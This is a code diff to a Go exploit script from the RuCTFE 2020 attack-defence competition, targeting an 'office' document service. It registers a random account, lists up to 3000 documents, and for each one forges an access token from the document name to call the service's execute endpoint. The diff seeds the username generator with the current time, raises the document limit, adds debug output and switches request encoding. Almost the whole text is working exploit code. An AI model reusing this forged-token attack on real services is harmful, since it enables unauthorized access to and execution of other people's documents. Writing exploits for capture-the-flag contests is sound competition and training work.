@@ -5,6 +5,7 @@ import (
 	"crypto/sha1"
 	"encoding/binary"
 	"encoding/hex"
+	"encoding/json"
 	"fmt"
 	pb "github.com/HackerDom/ructfe-2020/sploits/office/spl2/proto"
 	"google.golang.org/protobuf/encoding/protojson"
@@ -13,6 +14,7 @@ import (
 	"net/http"
 	"net/url"
 	"sync"
+	"time"
 )
 
 const (
@@ -35,6 +37,10 @@ type Jar struct {
 	lk      sync.Mutex
 	cookies map[string][]*http.Cookie
 }
+
+type execRequest struct{
+	Token string `json:"token"`
+	DocId int64 `json:"doc_id"`}
 
 func NewJar() *Jar {
 	jar := new(Jar)
@@ -61,7 +67,7 @@ func (jar *Jar) Cookies(u *url.URL) []*http.Cookie {
 func username() string {
 	const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
 	b := make([]byte, 10)
-	s := rand.New(rand.NewSource(1234))
+	s := rand.New(rand.NewSource(time.Now().UnixNano()))
 	for i := range b {
 		b[i] = letterBytes[s.Intn(len(letterBytes))]
 	}
@@ -79,6 +85,7 @@ func main() {
 		Bio:      "asdfasdf",
 	}
 	regReqJson, err := protojson.Marshal(req)
+	fmt.Printf("Payload %s\n", regReqJson)
 	if err != nil {
 		panic(err)
 	}
@@ -86,10 +93,10 @@ func main() {
 	if err != nil {
 		panic(err)
 	}
-	fmt.Println(jar)
+	fmt.Printf("My JAR: %s\n", httpClient.Jar)
 	listReq := &pb.ListDocumentsRequest{
 		Offset: 0,
-		Limit:  100,
+		Limit:  3000,
 	}
 	listReqJson, err := protojson.Marshal(listReq)
 	if err != nil {
@@ -110,15 +117,11 @@ func main() {
 	}
 	for _, d := range listRespPorto.Docs {
 		fmt.Printf("id: %d, name: %s\n", d.Id, d.Name)
-		execReq := &pb.ExecuteRequest{
-			Token: RandDigest(d.Name),
-			DocId: d.Id,
-		}
-		execReqJson, err := protojson.Marshal(execReq)
+		execReq, err := json.Marshal(execRequest{RandDigest(d.Name), d.Id})
 		if err != nil {
 			panic(err)
 		}
-		execResp, err := httpClient.Post("http://"+Addr+"/api/docs/execute", "application/json", bytes.NewBuffer(execReqJson))
+		execResp, err := httpClient.Post("http://"+Addr+"/api/docs/execute", "application/json", bytes.NewBuffer(execReq))
 		if err != nil {
 			panic(err)
 		}
